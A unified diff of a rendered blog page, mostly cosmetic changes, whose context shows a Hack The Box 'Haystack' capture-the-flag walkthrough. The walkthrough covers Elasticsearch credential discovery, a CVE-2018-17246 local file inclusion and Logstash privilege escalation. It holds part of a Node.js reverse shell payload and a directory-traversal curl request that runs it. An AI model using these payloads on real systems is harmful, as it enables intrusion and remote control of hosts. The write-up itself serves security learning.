@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-haystack-writeup\/"
@@ -511,7 +515,7 @@
 <h1 id="information-gathering">Information Gathering</h1>
 <h2 id="port-scan-nmap">Port Scan: Nmap</h2>
 <p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC 10.10.10.115
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC 10.10.10.115
 </span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.115
 </span></span><span style="display:flex;"><span>Host is up (0.38s latency).
@@ -538,7 +542,7 @@
 <p>We see that there&rsquo;s an Nginix page hosting only an image. This is a CTF after all, so let&rsquo;s check and see if there&rsquo;s anything hidden in this picture.</p>
 <p><img src="/posts/images/hack-the-box-haystack-writeup/port80.png" alt="Port 80">
 <strong>Figure 1:</strong> needle.jpg displayed on port 80.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# strings -10 needle.jpg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# strings -10 needle.jpg
 </span></span><span style="display:flex;"><span>paint.net 4.1.1
 </span></span><span style="display:flex;"><span>%&amp;<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">()</span>*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
 </span></span><span style="display:flex;"><span>&amp;&#39;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
@@ -561,7 +565,7 @@
 </blockquote>
 <h2 id="they-haystack-port-9200-elasticsearch">They Haystack: Port 9200 (Elasticsearch)</h2>
 <p>The Elasticsearch database is where the haystack resides. When it&rsquo;s queried we see that it&rsquo;s version <code>6.4.2</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.115:9200
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.115:9200
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  &#34;name&#34; : &#34;iQEYHgS&#34;,
 </span></span><span style="display:flex;"><span>  &#34;cluster_name&#34; : &#34;elasticsearch&#34;,
@@ -580,10 +584,10 @@
 </span></span><span style="display:flex;"><span>  &#34;tagline&#34; : &#34;You Know, for Search&#34;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This version should have a local file inclusion vulnerability <code>CVE-2018-17246</code>, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for <code>key</code>, nothing comes up. Using Spanish though, and making the query for <code>clave</code>, it returns some interesting records.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# curl -X GET &#34;http://10.10.10.115:9200/_search?q=clave&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# curl -X GET &#34;http://10.10.10.115:9200/_search?q=clave&#34;
 </span></span><span style="display:flex;"><span>{&#34;took&#34;:23,&#34;timed_out&#34;:false,&#34;_shards&#34;:{&#34;total&#34;:11,&#34;successful&#34;:11,&#34;skipped&#34;:0,&#34;failed&#34;:0},&#34;hits&#34;:{&#34;total&#34;:2,&#34;max_score&#34;:5.9335938,&#34;hits&#34;:[{&#34;_index&#34;:&#34;quotes&#34;,&#34;_type&#34;:&#34;quote&#34;,&#34;_id&#34;:&#34;45&#34;,&#34;_score&#34;:5.9335938,&#34;_source&#34;:{&#34;quote&#34;:&#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &#34;}},{&#34;_index&#34;:&#34;quotes&#34;,&#34;_type&#34;:&#34;quote&#34;,&#34;_id&#34;:&#34;111&#34;,&#34;_score&#34;:5.3459888,&#34;_source&#34;:{&#34;quote&#34;:&#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&#34;}}]}}
 </span></span></code></pre></div><p>Let&rsquo;s decode these two base64 strings and see what they&rsquo;re saying.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# echo dXNlcjogc2VjdXJpdHkg | base64 --decode
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# echo dXNlcjogc2VjdXJpdHkg | base64 --decode
 </span></span><span style="display:flex;"><span>user: security
 </span></span><span style="display:flex;"><span>root@kali:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 --decode
 </span></span><span style="display:flex;"><span>pass: spanish.is.key
@@ -591,7 +595,7 @@
 <h1 id="exploitation">Exploitation</h1>
 <h2 id="user-flag">User Flag</h2>
 <p>Using the credentials found in the Elasticsearch database we&rsquo;re able to ssh into the box and gain the user flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack ~]$ cat user.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack ~]$ cat user.txt
 </span></span><span style="display:flex;"><span>04d18bc79dac1d4d48ee0a940c8eb929
 </span></span></code></pre></div><h2 id="root-flag">Root Flag</h2>
 <p>It may be intuitive that we&rsquo;re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.</p>
@@ -599,7 +603,7 @@
 <p><img src="/posts/images/hack-the-box-haystack-writeup/elk_is_root.png" alt="ELK is root">
 <strong>Figure 2:</strong> Logstash is running as root.</p>
 <p>It&rsquo;s now clear to us that <code>logstash</code>, which is the <code>L</code> in <code>ELK</code>, is running as root. When we attempt to view the current configuration files for <code>logstash</code> we see that the <code>security</code> user we currently have a shell as isn&rsquo;t able to read them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack conf.d]$ pwd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack conf.d]$ pwd
 </span></span><span style="display:flex;"><span>/etc/logstash/conf.d
 </span></span><span style="display:flex;"><span>[security@haystack conf.d]$ ls -la
 </span></span><span style="display:flex;"><span>total 12
@@ -613,7 +617,7 @@
 </span></span></code></pre></div><h3 id="pivot-to-kibana-user">Pivot to kibana user</h3>
 <p>Researching known vulnerabilities in Elasticsearch <code>6.4.2</code>, we&rsquo;ve come across <a href="https://github.com/mpgn/CVE-2018-17246" target="_blank">CVE-2018-17246</a>. The Github user <a href="https://github.com/mpgn" target="_blank">mpgn</a> has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user <code>kibana</code>, and do more with <code>logstash</code> than we currently have permission to do.</p>
 <p>The javascript reverse shell code provided is as follows. All that&rsquo;s needed for this to work out of the box is replacing our IP and port that netcat is listening on.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>(){
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>(){
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, []);
@@ -630,11 +634,11 @@
 <p><img src="/posts/images/hack-the-box-haystack-writeup/kibana_yml.png" alt="kibana yml">
 <strong>Figure 3:</strong> kibana.yml</p>
 <p>We can make the following <code>curl</code> request to execute our reverse shell code.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack shm]$ curl -X GET <span style="color:#e6db74">&#34;localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/mahshell.js&#34;</span> -H <span style="color:#e6db74">&#34;kbn-xsrf: true&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack shm]$ curl -X GET <span style="color:#e6db74">&#34;localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/mahshell.js&#34;</span> -H <span style="color:#e6db74">&#34;kbn-xsrf: true&#34;</span>
 </span></span></code></pre></div><p><img src="/posts/images/hack-the-box-haystack-writeup/kibana_user.png" alt="kibana user">
 <strong>Figure 4</strong>: Shell as kibana user.</p>
 <p>Now that we are the user <code>kibana</code>, we go back to the configuration files under <code>/etc/logstash/conf.d</code> and check out what <code>filter.conf</code> contains.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>bash-4.2$ cd /etc/logstash/conf.d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>bash-4.2$ cd /etc/logstash/conf.d
 </span></span><span style="display:flex;"><span>cd /etc/logstash/conf.d
 </span></span><span style="display:flex;"><span>bash-4.2$ ls -la
 </span></span><span style="display:flex;"><span>ls -la
@@ -659,7 +663,7 @@
 </code></pre><p>After waiting a few seconds, the command to call our reverse shell is executed.</p>
 <p><img src="/posts/images/hack-the-box-haystack-writeup/rooted.png" alt="Rooted">
 <strong>Figure: 5</strong> Rooted</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[root@haystack /]# cat /root/root.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[root@haystack /]# cat /root/root.txt
 </span></span><span style="display:flex;"><span>cat /root/root.txt
 </span></span><span style="display:flex;"><span>3f5f727c38d9f70e1d2ad2ba11059d92
 </span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
